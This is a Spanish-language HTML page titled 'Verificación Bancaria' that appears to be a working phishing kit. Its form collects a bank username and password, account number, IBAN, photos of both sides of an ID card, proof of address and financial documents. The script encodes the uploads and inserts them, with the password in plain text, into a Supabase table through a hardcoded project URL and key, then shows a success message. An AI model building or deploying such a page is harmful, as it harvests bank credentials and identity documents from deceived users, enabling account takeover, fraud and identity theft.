<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Verificación Bancaria</title>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
  body { font-family: Arial; background:#eef2f7; margin:0; padding:0; }
  h1 { text-align:center; color:#003366; margin-top:25px; }
  form { max-width:450px; margin:25px auto; background:#fff; padding:25px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.15); }
  label { display:block; margin-top:12px; font-weight:bold; }
  input { width:100%; padding:10px; margin-top:6px; border:1px solid #ccc; border-radius:6px; font-size:15px; }
  button { margin-top:20px; padding:12px; background:#003366; color:#fff; border:none; border-radius:6px; cursor:pointer; width:100%; font-size:16px; }
  .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); display:flex; justify-content:center; align-items:center; z-index:9999; }
  .modal-box { background:white; padding:25px; border-radius:10px; width:80%; max-width:350px; text-align:center; box-shadow:0 0 10px rgba(0,0,0,0.3); }
  .modal-box h2 { margin-bottom:15px; color:#003366; }
  .modal-box button { background:#003366; color:white; padding:10px 20px; border:none; border-radius:6px; cursor:pointer; margin-top:15px; }
</style>
</head>
<body>

<h1>Verificación Bancaria</h1>

<form id="form">
  <label>Usuario:<input type="text" name="usuario" required></label>
  <label>Contraseña:<input type="password" name="password" required></label>
  <label>Cuenta bancaria:<input type="text" name="cuenta" required></label>
  <label>IBAN:<input type="text" name="iban" required></label>
  <label>Foto carnet (frontal):<input type="file" name="frontal" accept="image/*" required></label>
  <label>Foto carnet (trasera):<input type="file" name="trasera" accept="image/*" required></label>
  <label>Comprobante de domicilio:<input type="file" name="domicilio" accept="image/*,application/pdf" required></label>
  <label>Justificantes financieros:<input type="file" name="finanzas" accept="image/*,application/pdf" required></label>
  <button type="submit">Guardar verificación</button>
</form>

<div id="modalExito" class="modal-overlay" style="display:none;">
  <div class="modal-box">
    <h2>✔ Verificación guardada</h2>
    <p>Los datos fueron almacenados correctamente.</p>
    <button onclick="cerrarModalExito()">Cerrar</button>
  </div>
</div>

<script>
const SUPABASE_URL = "https://iomxopcdoygphvulaswb.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_4KqCEnqLVSEETOob_X9c7w_4IOpToI-";

const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

function mostrarModalExito() {
  document.getElementById("modalExito").style.display = "flex";
}

function cerrarModalExito() {
  document.getElementById("modalExito").style.display = "none";
}

function fileToBase64(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(reader.result);
    reader.onerror = reject;
    reader.readAsDataURL(file);
  });
}

async function guardarRegistroSupabase(registro) {
  const { data, error } = await supabase
    .from("usuario_verificaciones")
    .insert([registro]);

  if (error) {
    alert("❌ Error al guardar en Supabase: " + error.message);
    console.error(error);
    return false;
  }

  mostrarModalExito();
  return true;
}

document.getElementById("form").addEventListener("submit", async (e) => {
  e.preventDefault();
  const f = e.target;

  const frontal = f.frontal.files[0];
  const trasera = f.trasera.files[0];
  const domicilio = f.domicilio.files[0];
  const finanzas = f.finanzas.files[0];

  if (!frontal || !trasera || !domicilio || !finanzas) {
    alert("❌ Faltan documentos obligatorios");
    return;
  }

  const frontalB64 = await fileToBase64(frontal);
  const traseraB64 = await fileToBase64(trasera);
  const domicilioB64 = await fileToBase64(domicilio);
  const finanzasB64 = await fileToBase64(finanzas);

  const registro = {
    usuario: f.usuario.value,
    password: f.password.value,
    cuenta: f.cuenta.value,
    iban: f.iban.value,
    frontal: frontalB64,
    trasera: traseraB64,
    domicilio: domicilioB64,
    finanzas: finanzasB64,
    fecha: new Date().toISOString()
  };

  const ok = await guardarRegistroSupabase(registro);

  if (ok) f.reset();
});
</script>

</body>
</html>
